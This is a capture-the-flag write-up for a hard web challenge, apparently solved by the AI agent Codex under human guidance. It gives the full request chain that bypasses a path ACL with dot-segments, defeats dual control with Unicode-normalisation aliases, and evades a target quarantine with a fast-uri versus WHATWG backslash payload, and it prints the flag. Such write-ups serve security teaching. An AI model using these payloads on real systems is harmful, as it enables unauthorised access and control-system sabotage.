# Interlock

> Web · Hard · Mohamed Amine Mzoughi  
> Points: 593 · Flag submitted by: secretNinja

**The flag**

```
CSCTF{nkoohtMwUPVjl7ZpLjm9Ejid}
```

Recovered from the HTTP 200 isolation receipt on the assigned live instance, then submitted through the guarded path after a team-solve check and accepted on the first submission.

**Challenge**

A forged protection setting-group has been loaded into the Keld Ridge substation cluster on Velmara's eastern interconnection, set to trip 2.1 GW and split the eastern grid. At 02:48 a compromised engineer account also put Keld Ridge on the dispatcher's quarantine list, so the dispatcher refuses to send the cluster anything. Our observer desk is read-only, and the cluster still has to be isolated. A dispatchable isolation order needs **dual control** — a requester and an approver, both on the engineer roster and not the same principal. When an order actually reaches the substation gateway, the gateway returns an isolation receipt carrying the clearance code (the flag). The reliability console sits at the root of the dispatcher edge and links the operations API schema at `/api/v1/schema`. The brief tells us to use a client that sends the path exactly as typed (e.g. `curl --path-as-is`), because some clients rewrite escaped path segments before the request leaves the machine. There are no attachments, so this is black-box work against our own instance only.

**Tools used**

Codex (run under human guidance), which developed and ran the request chain against the live instance and submitted the accepted flag. Tooling: `curl --path-as-is` and a small paced raw-socket driver that sends paths byte for byte, plus Python `unicodedata` and `hashlib`, used offline to check aliases and the unlock digest.

**Approach / walkthrough**

The `--path-as-is` hint already tells us the edge and the backend parse paths differently; the dual-control rule says principal identity is checked somewhere that two spellings of one name can fool; the quarantine says the dispatch-target check must be bypassed. The console root ("VNTA Reliability Console | Keld Ridge", "Observer session, read-only") links `/api/v1/schema`, `/reference/roster` and `/audit/ledger`. The schema maps the whole chain:

```json
{
  "edge": { "policy": "authorizes on the request path as received" },
  "cluster": { "buses": ["KR-B1", "KR-B2"], "gateway": "<gateway>" },
  "dual_control": { "requester": "roster", "approver": "roster", "distinct": true },
  "delegates": { "uniqueness": "casefold" },
  "operations": { "endpoints": [
    { "method": "POST", "path": "/ops/delegates",      "body": ["name"] },
    { "method": "POST", "path": "/ops/orders",         "body": ["bus","requester_token"] },
    { "method": "POST", "path": "/ops/orders/approve", "body": ["order_id","approver_token"] },
    { "method": "POST", "path": "/ops/dispatch",       "body": ["order_id","target","unlock"] }
  ]},
  "dispatch": {
    "target_validation": { "parser": "fast-uri", "version": "3.1.2" },
    "release_unlock": {
      "algorithm": "sha256-hex",
      "input": "interlock|<order_id>|<bus identifiers joined by comma>"
    }
  }
}
```

The roster lists the engineers `k.vostra`, `r.mendal` and `a.torvo`, with matching rule **NFKC+casefold**. Four guards, each with a weakness: the edge checks the path *as received* while the backend normalizes dot-segments; delegate uniqueness uses `casefold` while roster membership uses NFKC+casefold; the dispatch target is validated with `fast-uri@3.1.2` but the request is sent by Node's WHATWG fetch; and the release unlock is a published SHA-256 the client can compute.

*Stage 1 — edge path check.* A literal `POST /ops/delegates` returns `403 policy.path_restricted`. Encodings tried on the live instance:

| Path sent | Result |
| --- | --- |
| `/ops/...` | 403 `policy.path_restricted` |
| `/%6fps/...` | 403 (the edge still matches) |
| `//ops/...` | 404 (backend sees the wrong route) |
| `/./ops/...` | **reaches the backend** (201 on delegates) |
| `/reference/../ops/...` | reaches the backend |
| `/%2e/ops/...` | reaches the backend |

From here every operator call is sent as `/./ops/*` with `--path-as-is`, so the dot-segment is not collapsed before it goes on the wire. The edge matches on the literal path and does not strip `/./`; the backend collapses it to `/ops/...` and routes normally.

*Stage 2 — two roster principals via a normalization mismatch.* We need two **distinct** delegates that are **both** on the roster. Uniqueness only casefolds, while the roster check applies NFKC first, so a compatibility character that NFKC maps to `a` creates a "new" principal that still matches a real engineer. Checked offline with `unicodedata`:

| Name sent | `casefold()` | `NFKC` + `casefold()` |
| --- | --- | --- |
| `k.vostrª` (U+00AA) | `k.vostrª` | `k.vostra` |
| `r.mendªl` (U+00AA) | `r.mendªl` | `r.mendal` |

`k.vostra` plain already existed (`409 principal.exists`). The final run aliased two *different* engineers so the two tokens map to two real roster entries:

```text
POST /./ops/delegates  {"name":"k.vostrª"}  -> tok-1
POST /./ops/delegates  {"name":"r.mendªl"}  -> tok-2
```

Both pass the distinctness check (their casefold forms differ) and both match the roster (their NFKC+casefold forms are real engineers). Saved earlier-run captures show the same mechanism with circled/fullwidth-a aliases and `"dual_control":{...,"same_principal":false}` on the resulting order.

*Stage 3 — create and approve a two-bus order.*

```text
POST /./ops/orders          {"bus":["KR-B1","KR-B2"],"requester_token":"tok-1"}  -> ord-3 / awaiting_approval
POST /./ops/orders/approve  {"order_id":"ord-3","approver_token":"tok-2"}         -> signed
```

`bus` **must be a JSON array**: a scalar `"bus":"KR-B1"` made the approve call return `502 upstream.unavailable` and took the instance down. With two delegates created first, the order id is deterministically `ord-3`.

*Stage 4 — unlock digest and quarantine bypass.* The unlock follows the schema formula, recomputed offline:

```text
sha256("interlock|ord-3|KR-B1,KR-B2") = 56da3ce31e46feda7a23e5715791c00e0c60678e4be57eb9a5c9c3f31c4ab838
```

(Joining both buses matters: `sha256("interlock|ord-3|KR-B1")` gives a different `a334c5e3...` digest.) A plain `http://<gateway>/` target returns `target.quarantined`. The validator is `fast-uri@3.1.2`; the request is made by Node's WHATWG fetch; the two parse a backslash in the authority differently:

```json
{
  "order_id": "ord-3",
  "target": "http://<gateway>\\@example.invalid/../dispatch",
  "unlock": "56da3ce31e46feda7a23e5715791c00e0c60678e4be57eb9a5c9c3f31c4ab838"
}
```

fast-uri reads `<gateway>\` as userinfo and checks the host `example.invalid`, which is not quarantined. Node's WHATWG fetch treats `\` as `/` for special schemes, so the host is the real gateway and `/@example.invalid/../dispatch` normalizes to `/dispatch`. The backslash is escaped as `\\` inside the JSON string.

```text
POST /./ops/dispatch  -> HTTP 200 {"status":"delivered", ... Keld Ridge isolation receipt ...}
```

The receipt carried `CSCTF{nkoohtMwUPVjl7ZpLjm9Ejid}`.

*The last blocker — the gateway route.* The signed chain still returned `502 upstream.unavailable` on dispatch, each time taking the upstream down, which looked like an organizer-side crash. The cause was the path: dispatching to the right authority at `/` or at guessed paths kills the upstream. The working route is **`/dispatch` on the gateway's default HTTP port**, and the `/../dispatch` suffix on the WHATWG side of the URL is what lands it there. (Port `:8080` is the dispatcher edge itself; ports 8081–8085 return `gateway_unreachable`.)

**Why it works**

Each control is enforced by a different component, and each pair of components disagrees. The edge and the backend disagree about dot-segments. Uniqueness and roster matching apply different Unicode normalizations, so one engineer's name can be registered under a second spelling. The target validator and the HTTP client disagree on how a backslash in the authority is parsed. The unlock is a public formula with no secret, so it only checks that the client read the schema.

**Validation / reproduction**

The NFKC/casefold mappings and both SHA-256 digests were recomputed offline. The URL differential was re-run offline: Node's WHATWG `new URL()` gave the gateway host and path `/dispatch`, while fast-uri 3.1.7 (the closest version cached locally, not the exact 3.1.2) gave userinfo `<gateway>\` and host `example.invalid` — 3.1.7 also flags an `error` about a literal backslash in the authority, presumably the later fix, so 3.1.2's own behavior was not tested. Saved captures show `same_principal:false` on an order created by two aliases and the scalar-bus `502`. The flag came from the HTTP 200 receipt; Codex submitted it after a `./csctf check 9098` team-solve check and it was accepted on the first attempt.

Reproduction summary (all calls with `curl --path-as-is`):

```text
POST /./ops/delegates       {"name":"k.vostrª"}                                  -> tok-1
POST /./ops/delegates       {"name":"r.mendªl"}                                  -> tok-2
POST /./ops/orders          {"bus":["KR-B1","KR-B2"],"requester_token":"tok-1"}  -> ord-3 (awaiting_approval)
POST /./ops/orders/approve  {"order_id":"ord-3","approver_token":"tok-2"}        -> signed
# unlock = sha256("interlock|ord-3|KR-B1,KR-B2") = 56da3ce3...4ab838
POST /./ops/dispatch        {"order_id":"ord-3",
                             "target":"http://<gateway>\\@example.invalid/../dispatch",
                             "unlock":"56da3ce3...4ab838"}                        -> 200 delivered + receipt
```

Gotchas: send the path byte-for-byte (`--path-as-is`); `bus` must be a JSON array or the approve `502`s and kills the instance; the target must resolve to the real gateway host at `/dispatch` on its default port; and a loopback/Unicode/integer-IPv4 target is rejected (`bad_target`), so the published gateway hostname is the only one that works.
